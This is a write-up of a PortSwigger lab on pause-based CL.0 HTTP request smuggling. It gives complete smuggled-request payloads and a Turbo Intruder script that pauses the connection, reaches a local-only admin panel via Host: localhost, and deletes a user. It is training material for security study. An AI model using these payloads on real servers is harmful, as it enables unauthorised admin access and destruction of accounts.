# Server-Side Pause-Based Request Smuggling (CL.0) — PortSwigger Lab

>

 **Lab:** Server-side pause-based request smuggling  

> **Category:** HTTP Request Smuggling / Browser-Powered Desync  

> **Technique:** Pause-based CL.0 desynchronization  

> **Tool:** Burp Suite + Turbo Intruder  

> **Difficulty:** Expert



---



## 1. Lab Overview



This lab is vulnerable to **pause-based server-side request smuggling**.



The front-end server streams requests to the back-end, while the back-end does not close the connection after a 
timeout on certain endpoints.



The goal is to:



1. Identify a pause-based **CL.0 desync** vector.

2. Smuggle a request to the `/admin/` endpoint.

3. Access the admin panel by using `Host: localhost`.

4. Find the delete-user form and its CSRF token.

5. Smuggle a request to delete the user `carlos`.



Official PortSwigger solution:



https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/
lab-server-side-pause-based-request-smuggling



---



# 2. What is Pause-Based Desynchronization?



Normally, the front-end and back-end should agree about where one HTTP request ends and the next one begins.



In a pause-based desync, we intentionally create a situation where:



```text

Front-end

    |

    | sends request headers

    v

Back-end

    |

    | waits for body

    |

    | timeout

    v

Response

    |

    | connection remains open
    v

Remaining bytes arrive

    |


    v

Back-end may interpret them as another request



The important idea is:



> We send the headers, promise that a body is coming, and then pause the connection.







PortSwigger describes this as a pause-based desynchronization attack.





---


3. Why /resources?


First, inspect the server response in Burp.



The lab uses:


Server: Apache/2.4.52



Apache 2.4.52 can be vulnerable to pause-based CL.0 attacks on endpoints that trigger server-level redirects.



Try:



GET /resources HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net



The server redirects:




HTTP/1.1 302 Found

Location: /resources/



The important point is:



/resources

     |

     v

server-level redirect
     |

     v

/resources/



This makes /resources a useful desync vector.





---



4. Send the Request to Turbo Intruder



In Burp:




Right click

    ↓

Extensions

    ↓

Turbo Intruder

    ↓

Send to Turbo Intruder



Change the request method to:



POST /resources HTTP/1.1



Also make sure the connection is persistent:


Connection: keep-alive





---


5. First Desync Probe


Add a complete request to /admin/ inside the body of the outer request.



The structure is:


POST /resources HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

Cookie: session=YOUR-SESSION-COOKIE

Connection: keep-alive

Content-Type: application/x-www-form-urlencoded

Content-Length: CORRECT



GET /admin/ HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net




There are two logical requests here:


Outer request:

POST /resources



        +



Smuggled request:

GET /admin/




The GET /admin/ request is placed in the body of the outer request.





---



6. Turbo Intruder Script — Initial Probe




Use:



def queueRequests(target, wordlists):

    engine = RequestEngine(

        endpoint=target.endpoint,

        concurrentConnections=1,

        requestsPerConnection=500,

        pipeline=False

    )



    engine.queue(

        target.req,
        pauseMarker=['\r\n\r\n'],

        pauseTime=61000

    )




    engine.queue(target.req)





def handleResponse(req, interesting):

    table.add(req)





---



7. Understanding the Script



concurrentConnections=1



We intentionally use one connection:



Connection #1

    |

    +--- Request 1

    |

    +--- Request 2



The attack depends on reusing the same connection between the front-end and back-end.





---



requestsPerConnection=500



This allows Turbo Intruder to send many requests over the same connection.


The important part is connection reuse.





---



pipeline=False



We are not relying on normal HTTP pipelining.



The important sequence is:



Send

 ↓

Pause

 ↓

Wait

 ↓

Resume

 ↓

Send again





---



pauseTime=61000


pauseTime=61000



means:



61,000 milliseconds

=

61 seconds



The back-end gets enough time to hit its timeout while waiting for the body.





---


pauseMarker



Initially:



pauseMarker=['\r\n\r\n']



The sequence:



\r\n\r\n



marks the end of the HTTP headers.



For example:



POST /resources HTTP/1.1

Host: example.com

Content-Length: 100



<--- body starts here



The blank line between the headers and body is:



\r\n\r\n





---



8. What Happens During the Pause?



The sequence is approximately:



Turbo Intruder

      |

      | Send headers

      v

Front-end

      |

      | forwards headers

      v

Back-end

      |

      | waits for body

      |

      | 61 seconds

      v

   timeout

      |

      v


Back-end sends response

      |

      | connection remains open

      v

Turbo Intruder resumes

      |

      | remaining bytes

      v

Back-end



The important point is that the connection can remain usable after the back-end timeout.



This creates the possibility of a desynchronization.





---



9. Confirming the Vulnerability



Launch the Turbo Intruder attack.



Initially, there may be no visible result.



After approximately:



61 seconds


you should see two relevant responses.



Response 1



The outer request:



POST /resources



behaves normally and redirects to:



/resources/



Response 2



The smuggled request:



GET /admin/


gets a response.



Initially, the response may say that:



Admin panel is only accessible to local users



This is important.



It means that:



GET /admin/




actually reached the back-end.


Therefore:


Pause-based CL.0 desync

        |
        v

      CONFIRMED





---


10. Why This Confirms the Desync



We did not simply request:


GET /admin/



normally.



Instead, the request was placed inside:



POST /resources



and was sent after the pause.


If the back-end responds to the inner request separately, the front-end and back-end are no longer synchronized 
about the request boundaries.


Therefore the smuggling vector works.





---


11. Exploiting the Desync — Host: localhost



Now modify the smuggled request.



Change:



Host: YOUR-LAB-ID.web-security-academy.net



to:



Host: localhost


The payload becomes:



POST /resources HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

Cookie: session=YOUR-SESSION-COOKIE

Connection: keep-alive
Content-Type: application/x-www-form-urlencoded

Content-Length: CORRECT



GET /admin/ HTTP/1.1
Host: localhost



Important



The outer request still uses:



Host: YOUR-LAB-ID.web-security-academy.net


Only the inner/smuggled request uses:



Host: localhost




---



12. Why Host: localhost?


The admin panel is restricted to local users.



Previously:



GET /admin/

Host: YOUR-LAB-ID.web-security-academy.net


returned the restriction.




But:


GET /admin/

Host: localhost


is treated as a local request by the back-end.




Therefore:


Smuggled request

      |

      +--- Host: localhost

      |

      v

/admin/

      |

      v
Admin panel





---



13. Extracting the Delete Form




After launching the attack again and waiting for the pause:



61 seconds




the response should contain the admin panel.



Inspect the HTML form used to delete a user.



Take note of:



Action



/admin/delete



Parameter



username



CSRF token



Something similar to:



csrf=YOUR-CSRF-TOKEN



The exact token is unique to the lab session.





---




14. Reconstructing the Delete Request



The request submitted by the admin form is essentially:



POST /admin/delete/ HTTP/1.1

Host: localhost

Content-Type: application/x-www-form-urlencoded

Content-Length: CORRECT



csrf=YOUR-CSRF-TOKEN&username=carlos



We now need to smuggle this request through /resources.




---


15. Final Smuggled Payload



The overall request becomes:



POST /resources HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net


Cookie: session=YOUR-SESSION-COOKIE

Connection: keep-alive

Content-Type: application/x-www-form-urlencoded

Content-Length: CORRECT




POST /admin/delete/ HTTP/1.1

Host: localhost

Content-Type: application/x-www-form-urlencoded

Content-Length: CORRECT



csrf=YOUR-CSRF-TOKEN&username=carlos



There are now two HTTP requests:


Outer request

-------------------------

POST /resources





Inner request

-------------------------

POST /admin/delete/

Host: localhost



csrf=...

username=carlos





---



16. Important: There Are Now Two \r\n\r\n



This is a very important part of the lab.



The final payload contains:



Outer headers

      |

      +--- \r\n\r\n

      |

      v

Inner headers

      |

      +--- \r\n\r\n

      |

      v

Inner body



So there are two header terminators.



If we use:



pauseMarker=['\r\n\r\n']



Turbo Intruder can match the first occurrence, but the final payload contains another occurrence later.



For the final exploit, we want the marker to specifically identify the end of the outer headers.





---



17. Fixing the pauseMarker



Use:



pauseMarker=['Content-Length: CORRECT\r\n\r\n']



For example, if the actual outer request contains:



Content-Length: 177



then:



pauseMarker=['Content-Length: 177\r\n\r\n']



This tells Turbo Intruder:



Find:



Content-Length: 177

\r\n

\r\n

and pause there.





---



18. The 171 vs 177 Problem



This was the important issue during the lab.


The incorrect marker was:



pauseMarker=['Content-Length: 171\r\n\r\n']



But the actual request contained:



Content-Length: 177



Therefore:



171 != 177



The marker did not match the actual request.



After changing it to:



pauseMarker=['Content-Length: 177\r\n\r\n']



we have:



177 == 177



The marker now matches the intended location.



The attack works.




---


19. Important: 177 Is NOT a Magic Number



Do not memorize:


177



as the value required by the lab.



The correct rule is:


pauseMarker Content-Length

        =

actual Content-Length of the outer request


So if your outer request says:



Content-Length: 177



use:


pauseMarker=['Content-Length: 177\r\n\r\n']



If your outer request says:



Content-Length: 91



use:



pauseMarker=['Content-Length: 91\r\n\r\n']



The number depends on the actual request body.





---



20. Calculating the Correct Content-Length



The Content-Length belongs to the body of the request immediately preceding it.



For the outer request:


POST /resources HTTP/1.1

...

Content-Length: CORRECT



POST /admin/delete/ HTTP/1.1

Host: localhost

...



the Content-Length must correspond to the body that follows the outer headers.



That means you need to account for all the bytes in the smuggled request/body exactly as sent.



Remember:



\r\n



is part of the transmitted bytes.


And:



\r\n\r\n


is also part of the transmitted bytes.




Therefore don't estimate the length manually if Burp/Turbo Intruder can calculate or preserve the correct request 

length.




---



21. Final Turbo Intruder Script



The final script is:



def queueRequests(target, wordlists):

    engine = RequestEngine(

        endpoint=target.endpoint,

        concurrentConnections=1,

        requestsPerConnection=500,

        pipeline=False

    )


    engine.queue(


        target.req,

        pauseMarker=['Content-Length: CORRECT\r\n\r\n'],

        pauseTime=61000

    )



    engine.queue(target.req)





def handleResponse(req, interesting):

    table.add(req)



Replace:



CORRECT



with the actual Content-Length value in your outer request.



For example:



pauseMarker=['Content-Length: 177\r\n\r\n']





---



22. Complete Attack Flow




The complete attack can be visualized as:



GET /resources

        |

        v

Server-level redirect

        |

        v

Potential pause-based CL.0 vector



        |

        v

POST /resources


        |


        +---- smuggled GET /admin/
        |


        v
Turbo Intruder

        |
        v

Pause for 61 seconds
        |
        v

Back-end timeout

        |

        v
Connection remains open

        |

        v

Smuggled request reaches back-end

        |

        v

/admin/

        |

        v

Host: localhost

        |

        v
Admin panel

        |

        v

Extract CSRF token

        |
        v


POST /admin/delete/
        |

        v

username=carlos
        |

        v
LAB SOLVED





---



23. Probe vs Exploit



Phase 1 — Identify the vulnerability



Payload:



POST /resources HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE

Connection: keep-alive

Content-Type: application/x-www-form-urlencoded

Content-Length: CORRECT



GET /admin/ HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net



Expected result:



GET /admin/



is processed separately.



This confirms the desync.





---




Phase 2 — Access the admin panel



Change only the inner Host:



GET /admin/ HTTP/1.1

Host: localhost



Expected result:



Admin panel





---



Phase 3 — Delete Carlos


Use:



POST /admin/delete/ HTTP/1.1

Host: localhost

Content-Type: application/x-www-form-urlencoded

Content-Length: CORRECT


csrf=YOUR-CSRF-TOKEN&username=carlos



Smuggle it through:



POST /resources


Expected result:



Lab solved





---


24. Common Mistakes



Mistake 1 — Wrong pauseMarker



Wrong:


pauseMarker=['Content-Length: 171\r\n\r\n']



Actual request:



Content-Length: 177

Therefore:




171 != 177



Correct:



pauseMarker=['Content-Length: 177\r\n\r\n']





---



Mistake 2 — Forgetting Connection: keep-alive


Use:



Connection: keep-alive



The attack depends on reusing the connection.





---


Mistake 3 — Changing the wrong Host


The outer request should still target the lab:



Host: YOUR-LAB-ID.web-security-academy.net



The smuggled request should use:



Host: localhost




---



Mistake 4 — Forgetting the CSRF token



Accessing /admin/ is not the final objective.



You need to extract the CSRF token from the admin form and include it:



csrf=YOUR-CSRF-TOKEN&username=carlos





---



Mistake 5 — Forgetting the second \r\n\r\n



The final payload has:


Outer headers

    ↓

\r\n\r\n

    ↓

Inner headers

    ↓
\r\n\r\n

    ↓

Inner body



This is why the final pauseMarker is made more specific:




pauseMarker=['Content-Length: CORRECT\r\n\r\n']


---


25. Key Concepts to Remember


1. Server-level redirect

/resources

    ↓


/resources/


This is the initial desync vector.




---




2. Pause



pauseTime=61000



The connection is paused for 61 seconds.





---



3. CL.0




The attack relies on the back-end not consuming the body as expected after the timeout/desynchronization.




---



4. Connection reuse



Connection: keep-alive



The same connection is important to the attack.




---



5. Smuggled request



Example:



GET /admin/

Host: localhost



The inner request is interpreted separately by the back-end.




---



6. Host: localhost



This bypasses the admin panel's local-only restriction.





---



7. CSRF token


The admin delete form supplies the token needed for:



POST /admin/delete/





---



8. pauseMarker



The final marker:



pauseMarker=['Content-Length: CORRECT\r\n\r\n']



must match the actual outer Content-Length header.





---



26. Final Mental Model



The most important thing to understand is not the exact number 177.



The real concept is:



Send headers

      ↓

Promise a body

      ↓

PAUSE

      ↓

Back-end waits

      ↓

Timeout

      ↓

Connection remains open

      ↓

Resume sending

      ↓

Back-end interprets the remaining bytes

as another HTTP request

      ↓

DESYNCHRONIZATION


      ↓

SMUGGLED REQUEST



For this lab:



/resources

     ↓

Pause-based CL.0

     ↓

/admin/

     ↓

Host: localhost

     ↓

Admin panel

     ↓

CSRF token

     ↓

/admin/delete/

     ↓

username=carlos

     ↓

SOLVED




---



27. Quick Revision



Vector:

    /resources



Method:

    POST



Connection:

    keep-alive



Tool:

    Turbo Intruder



Pause:

    61000 ms



Initial marker:

    \r\n\r\n




Final marker:

    Content-Length: CORRECT\r\n\r\n



First smuggled request:

    GET /admin/



Admin bypass:

    Host: localhost



Delete endpoint:

    /admin/delete/


Parameter:


    username=carlos



Required:

    CSRF token



Important:

    CORRECT must equal the actual outer Content-Length.





---



References


https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling?utm_source